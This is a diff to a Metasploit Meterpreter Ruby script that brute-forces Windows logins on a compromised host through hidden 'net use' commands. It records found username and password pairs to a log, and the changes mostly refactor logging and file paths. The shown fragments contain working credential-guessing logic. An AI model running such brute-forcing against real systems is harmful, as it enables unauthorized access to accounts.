@@ -1,10 +1,7 @@
 # $Id$
-
-#Meterpreter script for brute forcin logins on Windows 2003, Windows Vista
-#Windows 2008 and Windows XP targets using native windows commands.
-#Provided by Carlos Perez at carlos_perez[at]darkoperator.com
-#Verion: 0.1.0
-#Note: For some reason Multi-Threading Net use gives a lot of false positives
+# $Revision$
+# Author: Carlos Perez at carlos_perez[at]darkoperator.com
+#-------------------------------------------------------------------------------
 ################## Variable Declarations ##################
 @@exec_opts = Rex::Parser::Arguments.new(
   "-h"  => [ false,  "\tHelp menu."],
@@ -101,7 +98,7 @@ def passbf(session,passlist,target,user,opt,logfile)
 			      		result = output.to_s.scan(/The\scommand\scompleted\ssuccessfully/)
 			      		if result.length == 1
 			       			print_status("\tUser: #{u.chomp} pass: #{line.chomp} found")
-			       			filewrt(logfile,"User: #{u.chomp} pass: #{line.chomp}")
+			       			file_local_write(logfile,"User: #{u.chomp} pass: #{line.chomp}")
 			        		r = session.sys.process.execute("cmd /c net use \\\\#{target} /delete", nil, {'Hidden' => true, 'Channelized' => true})
 			        		while(d = r.channel.read)
 				       			 output << d
@@ -122,25 +119,16 @@ def passbf(session,passlist,target,user,opt,logfile)
 		passfnd = 0
 	end
 end
-#--------------------------------------------------------
 
-# Function for writing results of other functions to a file
-def filewrt(file2wrt, data2wrt)
-	output = ::File.open(file2wrt, "a")
-	data2wrt.each_line do |d|
-		output.puts(d)
-	end
-	output.close
-end
 #--------------------------------------------------------
 # Function for creating log file
 def logme(target)
 
 	# Create Filename info to be appended to  files
-	filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")+sprintf("%.5d",rand(100000))
+	filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 
 	# Create a directory for the logs
-	logs = ::File.join(Msf::Config.config_directory, 'logs', 'winbf', target)
+	logs = ::File.join(Msf::Config.log_directory,'scripts', 'winbf')
 
 	# Create the log directory
 	::FileUtils.mkdir_p(logs)
